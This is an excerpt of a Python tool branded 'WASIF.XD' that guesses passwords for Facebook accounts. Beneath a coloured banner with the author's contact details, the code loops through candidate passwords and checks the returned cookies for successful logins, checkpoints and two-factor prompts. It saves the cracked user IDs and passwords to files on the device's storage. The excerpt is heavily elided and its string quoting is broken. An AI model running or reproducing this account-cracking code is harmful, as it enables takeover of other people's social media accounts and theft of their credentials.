...
\033[1;37m╔════════════════════════════════════════════╗
\033[1;31m│\033[1;32m☞  \033[1;32m 𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m WASIF.XD                \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32m ဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪ ဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪ FORM PAKISTAN          \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32m wasifjani       \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m +923179873063          \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.4                       \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32m https://youtube.com/channel/UCyf2PxYhg6HEiNlhnNKgtvw          \033[1;31m│
\033[1;37m╚🅑︎🅗︎🅣︎PRAY FOR ME ANYTIME [MR WASIF]\033[1;37m🅑︎🅗︎🅣︎╝
\033[1;91m==========================================================
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-", wit)
    print("\t  Facebook : ဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪ ဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪဪ')
    print("\t  Fb page  : https://www.facebook.com/groups/1781194432004610/?ref=share')
    ...
    if f_token in my_server:
        ...
        print(" otherwise msg on this whatsapp +923179873063 \n")
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                os.system("play-audio WASIF.XD_OK.mp3")
                print('\r\033[1;32m[WASIF.XD-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/WASIF.XD-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio WASIF.XD_2F.mp3")
                    print('\r\033[1;34m[WASIF.XD-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/WASIF.XD-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio WASIF.XD_CP.mp3")
                    print(f'\r\033[1;30m[WASIF.XD-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/WASIF.XD-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                os.system("play-audio WASIF.XD-OK.mp3")
                print('\r\033[1;32m[WASIF.XD-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/WASIF.XD-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
